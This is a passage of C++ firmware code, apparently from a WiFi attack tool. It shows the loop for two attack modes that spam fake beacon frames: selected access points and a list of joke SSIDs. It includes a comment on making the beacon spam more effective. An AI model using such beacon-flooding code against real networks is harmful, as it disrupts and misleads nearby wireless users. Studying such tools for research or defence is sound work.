      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_AP_SPAM)) {
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(currentTime, access_points->get(i));
    }

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_RICK_ROLL))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 7; i++)
    {
      for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
      {
        broadcastSetSSID(currentTime, rick_roll[x]);
      }
    }

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      packets_sent = 0;
    }
  }
}
